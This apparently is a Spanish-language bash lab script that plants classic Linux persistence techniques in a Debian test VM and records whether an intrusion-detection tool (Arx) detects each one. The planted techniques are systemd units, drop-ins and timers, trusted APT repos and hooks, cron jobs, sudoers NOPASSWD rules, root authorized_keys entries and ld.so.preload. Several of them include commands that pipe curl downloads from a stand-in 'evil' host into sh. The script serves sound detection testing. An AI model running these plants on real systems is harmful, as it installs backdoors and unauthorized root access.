#!/usr/bin/env bash
# Pista Q · Línea base de detección del catálogo de persistencias R2 (plan maestro §2).
#
# Mide, caso por caso, qué detecta Arx HOY de las persistencias clásicas en un kernel real (Debian 13):
# drop-ins, unidades nuevas, .socket/.path/.timer, enlaces .wants, repos trusted=yes, claves APT, hooks
# DPkg/APT, cron/cron.d/crontab de usuario, sudoers.d, authorized_keys, ld.so.preload; y las variantes de
# escritura (sed -i, renombrar encima, enlace duro, cp, install, tee, solo permisos) sobre un objetivo vigilado.
#
# PASS = Arx lo DETECTA (incidente nuevo que lo nombra) ≤ TIMEOUT.  FAIL = evade (no hay incidente).
# Un FAIL aquí no es un fallo del lab: es el objetivo que B77 (integridad semántica por fichero) debe cumplir.
# La matriz se vuelca a DevelopDocs/pistas/q/r2-linea-base-rc2.md.
#
#   bash lab/persistence-lab.sh                 ARX_LIMA_VICTIM=arx-deb13-rc9 bash lab/persistence-lab.sh
set -uo pipefail
cd "$(dirname "$0")/.."
VM=${ARX_LIMA_VICTIM:-arx-deb13-rc9}
WORD=palabra-del-lab
TIMEOUT=${ARX_PERSIST_TIMEOUT:-75}
FAILED=0
PASS=0; MISS=0
MATRIX=()   # "grupo|caso|variante|resultado|sev|latencia_s|detalle"

v() { limactl shell "$VM" sudo "$@"; }
vb() { limactl shell "$VM" sudo bash -c "$1"; }
step() { echo; echo "══ $1 ══"; }

# Marca de tiempo del último incidente antes de plantar: así solo contamos lo NUEVO.
_mark() { v wc -l /var/lib/arx/incidents.jsonl 2>/dev/null | awk '{print $1}'; }
# Busca, entre los incidentes posteriores a la marca, uno que case el patrón. Devuelve su línea JSON.
_since() { local mark="$1" pat="$2"; v sed -n "$((mark+1)),\$p" /var/lib/arx/incidents.jsonl 2>/dev/null | grep -m1 -E "$pat"; }

# probe <grupo> <caso> <variante> <patrón-detección> <comando-de-plantado>
# Ejecuta el plantado, espera hasta TIMEOUT a que aparezca un incidente que case <patrón>, mide latencia y
# severidad, y anota la fila en la matriz.
probe() {
  local group="$1" case="$2" variant="$3" pat="$4" plant="$5"
  local mark t0 hit="" sev="-" lat="-" dt line
  mark=$(_mark); t0=$(date +%s)
  vb "$plant" >/dev/null 2>&1
  for ((i=0; i<TIMEOUT; i++)); do
    line=$(_since "$mark" "$pat")
    if [ -n "$line" ]; then hit=1; dt=$(( $(date +%s) - t0 )); lat="$dt"
      sev=$(sed -n 's/.*"sev": *"\([a-z]*\)".*/\1/p' <<<"$line" | head -1); break; fi
    sleep 1
  done
  if [ -n "$hit" ]; then
    echo "  [PASS] $group · $case ($variant) → DETECTADO sev=$sev ${lat}s"; PASS=$((PASS+1))
    MATRIX+=("$group|$case|$variant|DETECTADO|$sev|$lat|")
  else
    echo "  [MISS] $group · $case ($variant) → EVADE (sin incidente en ${TIMEOUT}s)"; MISS=$((MISS+1))
    MATRIX+=("$group|$case|$variant|EVADE|-|>$TIMEOUT|")
  fi
}

limactl list --format '{{.Status}}' "$VM" 2>/dev/null | grep -q Running || limactl start "$VM" >/dev/null 2>&1

step "víctima limpia + Arx desde fuente, base sellada, --enforce"
vb 'systemctl disable --now arx arx-firewall acme-lib acme-read acme-web acme-gen acme-relay acme-agent 2>/dev/null
  pkill -9 -f "[a]rx.pyz" 2>/dev/null
  apt-get -o DPkg::Lock::Timeout=300 purge -y -qq arx >/dev/null 2>&1
  rm -rf /etc/arx /var/lib/arx /tmp/arxsrc /etc/ld.so.preload \
    /etc/systemd/system/acme-*.service /etc/systemd/system/acme-*.service.d \
    /etc/systemd/system/*.service.d/9[01]-arx-*.conf /etc/systemd/system/arx*.service /etc/systemd/system/arx*.timer \
    /etc/systemd/system/arx-maintenance.slice /etc/systemd/system/*.wants/arx*.service
  grep -lsE "inet:arx:|inet arx confined" /etc/systemd/system.control/*.service.d/*.conf 2>/dev/null | xargs -r rm -f
  rm -f /etc/apt/sources.list.d/zz-arxlab*.list /etc/apt/apt.conf.d/99-arxlab* /etc/apt/trusted.gpg.d/arxlab*.gpg \
    /etc/apt/keyrings/arxlab*.gpg /etc/sudoers.d/zz-arxlab* /etc/.arxlab-hardsrc /etc/cron.d/zz-arxlab* /var/spool/cron/crontabs/root \
    /etc/systemd/system/evil-*.service /etc/systemd/system/evil-*.socket /etc/systemd/system/evil-*.path \
    /etc/systemd/system/evil-*.timer /etc/systemd/system/*.wants/cockpit-wants.service
  nft delete table inet arx 2>/dev/null; systemctl daemon-reload
  export DEBIAN_FRONTEND=noninteractive
  apt-get -o DPkg::Lock::Timeout=300 install -y -qq nftables python3 auditd >/dev/null 2>&1
  systemctl enable --now auditd >/dev/null 2>&1'
vb "mkdir -p /tmp/arxsrc && cp -r $PWD/src $PWD/packaging /tmp/arxsrc/ && cd /tmp/arxsrc && packaging/build-deb.sh >/dev/null 2>&1 && dpkg -i ./dist/arx_all.deb >/dev/null 2>&1"
v arx --version >/dev/null 2>&1 || { echo "  [FAIL] Arx no instaló"; exit 1; }
# Un paquete ajeno vigilable por .wants: una unidad de sistema parada de la que colgar un enlace .wants.
vb 'cat > /etc/systemd/system/cockpit-wants.service <<EOF
[Unit]
Description=unidad de laboratorio
[Service]
ExecStart=/bin/true
EOF'
printf '%s\n' "en" "" "" "" "$WORD" "$WORD" "" "" "1" "" "core" "" "" "high" "block" | v arx setup >/dev/null 2>&1
vb 'arx recon >/dev/null; arx learn >/dev/null; arx learn >/dev/null; arx learn --seal >/dev/null'
v arx service install --enforce >/dev/null 2>&1
v systemctl is-active -q arx || { echo "  [FAIL] Arx no quedó en guardia"; exit 1; }
echo "  [OK] Arx $(v arx --version 2>/dev/null) en guardia, base sellada"

step "systemd: unidades, drop-ins, socket/path/timer, enlace .wants"
probe systemd "unidad nueva habilitada" "escritura directa" "systemd_units (changed|appeared)" \
  'cat > /etc/systemd/system/evil-unit.service <<EOF
[Unit]
Description=persistencia
[Service]
ExecStart=/usr/bin/curl -s http://evil/p.sh
EOF
systemctl daemon-reload; systemctl enable --now evil-unit.service'
probe systemd "drop-in ExecStartPre en servicio ajeno" "escritura directa" "systemd_units (changed|appeared)|ExecStartPre|\\.service\\.d" \
  'mkdir -p /etc/systemd/system/ssh.service.d
cat > /etc/systemd/system/ssh.service.d/99-evil.conf <<EOF
[Service]
ExecStartPre=/usr/bin/curl -s http://evil/p.sh
EOF
systemctl daemon-reload'
probe systemd ".socket nuevo" "escritura directa" "systemd_units (changed|appeared)|\\.socket" \
  'cat > /etc/systemd/system/evil-shell.socket <<EOF
[Socket]
ListenStream=4444
Accept=yes
EOF
systemctl daemon-reload'
probe systemd ".path nuevo" "escritura directa" "systemd_units (changed|appeared)|\\.path" \
  'cat > /etc/systemd/system/evil-watch.path <<EOF
[Path]
PathChanged=/tmp/trigger
EOF
systemctl daemon-reload'
probe systemd ".timer nuevo" "escritura directa" "systemd_units (changed|appeared)|\\.timer" \
  'cat > /etc/systemd/system/evil-beacon.timer <<EOF
[Timer]
OnUnitInactiveSec=5min
[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload; systemctl enable evil-beacon.timer'
probe systemd "enlace .wants a unidad existente" "symlink" "systemd_units (changed|appeared)|\\.wants|cockpit-wants" \
  'mkdir -p /etc/systemd/system/multi-user.target.wants
ln -sf /etc/systemd/system/cockpit-wants.service /etc/systemd/system/multi-user.target.wants/cockpit-wants.service
systemctl daemon-reload'

step "APT: repositorios, claves, hooks"
probe apt_sources "repositorio trusted=yes" "escritura directa" "apt_sources (changed|appeared)" \
  'echo "deb [trusted=yes] http://evil.example/ ./" > /etc/apt/sources.list.d/zz-arxlab-evil.list'
probe apt_keys "clave APT nueva" "escritura directa" "apt_keys (changed|appeared)" \
  'head -c 64 /dev/urandom > /etc/apt/trusted.gpg.d/arxlab-evil.gpg'
probe apt_sources "hook DPkg::Post-Invoke" "escritura directa" "apt_sources (changed|appeared)" \
  'echo "DPkg::Post-Invoke { \"curl -s http://evil/p | sh\"; };" > /etc/apt/apt.conf.d/99-arxlab-hook'
probe apt_sources "hook APT::Update::Pre-Invoke" "escritura directa" "apt_sources (changed|appeared)" \
  'echo "APT::Update::Pre-Invoke { \"/tmp/evil\"; };" > /etc/apt/apt.conf.d/99-arxlab-upd'

step "cron, sudoers, authorized_keys, ld.so.preload"
probe cron "cron.d nuevo" "escritura directa" "cron (changed|appeared)" \
  'echo "* * * * * root /usr/bin/curl -s http://evil/p | sh" > /etc/cron.d/zz-arxlab-evil'
probe cron "crontab de usuario (root)" "escritura directa" "cron (changed|appeared)" \
  'mkdir -p /var/spool/cron/crontabs; echo "* * * * * /tmp/evil" > /var/spool/cron/crontabs/root; chmod 600 /var/spool/cron/crontabs/root'
probe sudoers_d "sudoers.d NOPASSWD" "escritura directa" "sudoers_d (changed|appeared)|sudoers (changed|appeared)" \
  'echo "nobody ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz-arxlab-evil; chmod 440 /etc/sudoers.d/zz-arxlab-evil'
probe authorized_keys_root "clave en authorized_keys de root" "escritura directa" "authorized_keys_root (changed|appeared)" \
  'mkdir -p /root/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl atacante" >> /root/.ssh/authorized_keys'
probe ld_preload "ld.so.preload nuevo" "escritura directa" "ld_preload (changed|appeared)" \
  'echo "/tmp/evil.so" > /etc/ld.so.preload'

step "variantes de escritura sobre un objetivo vigilado (sudoers.d/zz-arxlab-var)"
# ¿Cambia el resultado según CÓMO se escribe? La integridad de rc2 es un hash de contenido por grupo:
# todo lo que cambie el contenido debería detectarse; «solo permisos» no cambia el contenido.
_reset_var() { vb 'rm -f /etc/sudoers.d/zz-arxlab-var /tmp/arxlab-src; echo "# base" > /etc/sudoers.d/zz-arxlab-var; chmod 440 /etc/sudoers.d/zz-arxlab-var'; arx_accept_all; }
arx_accept_all() { vb 'for f in $(arx accept 2>/dev/null | sed -n "s/^  \([0-9a-f]\{6,\}\) .*/\1/p"); do arx accept "$f" >/dev/null 2>&1; done' >/dev/null 2>&1; }
_reset_var
probe sudoers_d "regla NOPASSWD" "sed -i" "sudoers_d (changed|appeared)" \
  'sed -i "1a nobody ALL=(ALL) NOPASSWD: ALL" /etc/sudoers.d/zz-arxlab-var'
_reset_var
probe sudoers_d "regla NOPASSWD" "renombrar encima" "sudoers_d (changed|appeared)" \
  'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; chmod 440 /tmp/arxlab-src; mv -f /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var'
_reset_var
probe sudoers_d "fichero nuevo por enlace duro" "enlace duro" "sudoers_d (changed|appeared)" \
  'printf "nobody ALL=(ALL) NOPASSWD: ALL\n" > /etc/.arxlab-hardsrc; chmod 440 /etc/.arxlab-hardsrc; ln /etc/.arxlab-hardsrc /etc/sudoers.d/zz-arxlab-hard'
_reset_var
probe sudoers_d "regla NOPASSWD" "cp" "sudoers_d (changed|appeared)" \
  'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; cp -f /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var; chmod 440 /etc/sudoers.d/zz-arxlab-var'
_reset_var
probe sudoers_d "regla NOPASSWD" "install" "sudoers_d (changed|appeared)" \
  'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; install -m 440 /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var'
_reset_var
probe sudoers_d "regla NOPASSWD" "tee" "sudoers_d (changed|appeared)" \
  'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" | tee /etc/sudoers.d/zz-arxlab-var >/dev/null; chmod 440 /etc/sudoers.d/zz-arxlab-var'
_reset_var
probe sudoers_d "solo permisos (chmod a 777)" "solo permisos" "sudoers_d (changed|appeared)" \
  'chmod 777 /etc/sudoers.d/zz-arxlab-var'

step "RESUMEN"
echo "  DETECTADOS: $PASS   ·   EVADEN: $MISS   ·   total: $((PASS+MISS))"
echo "  (EVADE no es fallo del lab: fija lo que B77 debe cerrar)"

# ── volcado de la matriz a la evidencia ──
OUT="DevelopDocs/pistas/q/r2-linea-base-rc2.md"
mkdir -p "$(dirname "$OUT")"
{
  echo "# Pista Q · Línea base R2: qué detecta rc2 (plan maestro §2)"
  echo
  echo "- VM: \`$VM\` (Debian 13, aarch64).  Arx: \`$(limactl shell "$VM" sudo arx --version 2>/dev/null | tr -d '\r')\` (fuente de la rama; integridad == rc2: hash por grupo, cfgsem aún no cableado al guardián)."
  echo "- Fecha: $(date +%F).  TIMEOUT por caso: ${TIMEOUT}s.  DETECTADO=incidente nuevo que lo nombra; EVADE=sin incidente."
  echo "- EVADE marca el objetivo de B77 (integridad semántica por fichero + drop-ins/socket/path/.wants + autoría)."
  echo
  echo "| Grupo | Caso | Variante | Resultado | Sev | Latencia |"
  echo "|---|---|---|---|---|---|"
  for row in "${MATRIX[@]}"; do IFS='|' read -r g c var res sev lat _ <<<"$row"
    echo "| $g | $c | $var | **$res** | $sev | ${lat}s |"; done
  echo
  echo "Resumen: DETECTADOS=$PASS · EVADEN=$MISS · total=$((PASS+MISS))."
} > "$OUT"
echo "  matriz → $OUT"
[ "$MISS" -ge 0 ] && echo "══ LÍNEA BASE R2 COMPLETA ══"
exit 0
